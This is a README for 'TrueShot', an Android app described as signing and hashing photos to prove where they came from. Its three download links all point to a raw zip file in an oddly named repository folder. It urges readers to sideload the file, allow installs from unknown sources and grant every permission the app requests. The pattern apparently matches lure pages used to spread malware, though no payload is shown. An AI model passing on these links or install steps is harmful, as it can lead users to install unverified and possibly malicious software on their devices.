# 📷 TrueShot - Verify Photos With Trusted Proof

[![Download TrueShot](https://img.shields.io/badge/Download-TrueShot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip)

## 🔍 What TrueShot Does

TrueShot helps you check if a photo came from a real Android device and if it has stayed unchanged. It uses cryptographic proof, so the app signs each photo with ECDSA P-256 and checks the file with SHA-256 hashing. It also uses sensor data from the phone to build a device fingerprint.

This makes it easier to confirm that a photo has a valid origin record. It is useful when you need a clean record of where a photo came from and whether it was altered.

## 🚀 Getting Started

TrueShot runs on Android devices. To use it, you need an Android phone or tablet and a way to install the app from the GitHub page.

### What you need

- An Android device
- Internet access
- Enough free storage for the app and saved photos
- Permission to install apps from outside the Play Store if needed

## 📥 Download and Install

1. Open the download page: [TrueShot on GitHub](https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip)
2. Find the latest release or the main app file on the page
3. Download the app to your Android device
4. Open the file from your Downloads folder
5. Allow your device to install the app if asked
6. Finish the install and open TrueShot

If your browser asks what to do with the file, choose to keep it and then open it after the download ends.

## 📱 First Use

After you install TrueShot:

1. Open the app
2. Give the app the permissions it asks for
3. Let it access the camera and photos if you want to sign or check images
4. Follow the on-screen steps to create or verify a photo record

TrueShot keeps the process simple. The app guides you through each step so you do not need technical knowledge.

## 📸 How It Works

When you take a photo with TrueShot, the app can create a proof record with these parts:

- A SHA-256 hash of the image
- An ECDSA P-256 signature
- A fingerprint from 14 phone sensors
- Time and device details that help identify the source

When you check a photo, TrueShot compares the data to see if the image matches the proof record. If the file changed, the hash will not match.

## ✅ Main Features

### 🔐 Signed photo proof

TrueShot signs photo data with ECDSA P-256. This gives each image a secure proof record that links it to the device that made it.

### 🧮 SHA-256 file check

The app uses SHA-256 to create a file hash. If even one pixel changes, the hash changes too.

### 📟 14-sensor fingerprinting

TrueShot uses signals from 14 sensors to help identify the device. This adds another layer of origin data.

### 🛡️ Privacy-first design

TrueShot focuses on local device use and proof creation. It is built to help users confirm photo origin without extra steps.

### 🧾 Content credential support

TrueShot follows the idea of content credentials, so images can carry trust data that helps with later checks.

### 🎛️ Simple Android interface

The app uses a clean Android screen layout. Buttons and steps are easy to follow on a phone.

## 🧭 How to Use It

### To create a proof for a photo

1. Open TrueShot
2. Choose the option to capture or add a photo
3. Take the photo or pick one from your gallery
4. Wait for the app to generate the proof
5. Save the result if you want to verify it later

### To verify a photo

1. Open TrueShot
2. Choose the verify option
3. Select the photo or proof file
4. Wait while the app checks the hash and signature
5. Review the result on the screen

If the photo matches the stored proof, the app shows that the file is valid. If the image changed, the check fails.

## 🧰 Tips for Best Results

- Use the same device when you create and verify proof
- Keep the original photo file
- Do not edit the image after you create the proof
- Save the proof file in a safe place
- Make sure your device time is correct

These steps help keep your verification clean and easy to repeat.

## 📂 File and Data Handling

TrueShot may create proof files, signed records, and verification data. Keep these files with the original photo if you want to check them later.

Good places to store them:

- A secure folder on your device
- A backed-up photo archive
- A cloud folder you trust

If you move the photo, keep the proof file with it.

## 🔧 Android Setup Notes

If your phone blocks the install, open your device settings and allow app installs from the browser or file manager you used to download TrueShot. This is a normal Android step for apps outside the Play Store.

If the app asks for camera or storage access, allow it so it can sign and verify photos.

## 🧪 Project Stack

TrueShot uses:

- Kotlin
- Jetpack Compose
- Android APIs
- Cryptography tools for signing and hashing
- Sensor data from the device
- SHA-256
- ECDSA P-256

These parts work together to create a proof record for each photo.

## 🔎 Who It Is For

TrueShot is useful for people who need a simple way to check photo origin, such as:

- Journalists
- Field workers
- Legal teams
- Privacy-focused users
- Anyone who wants a trust record for photos

It helps when you need a clear way to see whether a photo came from a real device and stayed unchanged.

## 🛠️ Troubleshooting

### The app will not install

- Check that the download finished
- Open the file again from Downloads
- Allow installs from your browser or file manager
- Make sure your device has enough free space

### The app does not open

- Restart your phone
- Try opening it again
- Check that the install finished fully

### Verification fails

- Confirm that you used the original photo
- Check that the proof file matches the image
- Make sure the file was not edited or compressed

### Camera access does not work

- Open Android settings
- Find TrueShot in the app list
- Turn on camera permission
- Open the app again

## 📎 Download Again

If you need the app file again, use this link: [https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip](https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip)

## 📘 About the Repository

TrueShot is an open-source Android app built for photo verification. It uses cryptographic signing, hashing, and sensor fingerprints to help users check whether a photo is authentic and unchanged.